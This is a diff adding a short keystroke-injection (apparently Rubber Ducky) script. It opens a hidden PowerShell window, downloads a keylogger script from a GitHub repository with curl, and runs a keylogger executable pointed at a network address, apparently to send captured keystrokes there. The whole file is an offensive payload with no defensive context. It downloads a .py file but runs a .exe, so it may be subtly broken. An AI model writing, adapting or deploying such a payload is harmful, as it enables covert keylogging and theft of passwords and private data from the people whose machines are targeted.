@@ -1,0 +1,17 @@
+DELAY 500
+GUI r
+STRING powershell -WindowStyle hidden
+DELAY 800
+ENTER
+DELAY 500
+STRING curl https://raw.githubusercontent.com/Arkani/590J-JMJ/master/keylogger.py -o keylogger.py
+ENTER
+DELAY 5000
+GUI r
+STRING powershell -WindowStyle hidden
+DELAY 800
+ENTER
+DELAY 500
+STRING .\keylogger.exe 192.168.1.143
+ENTER
+
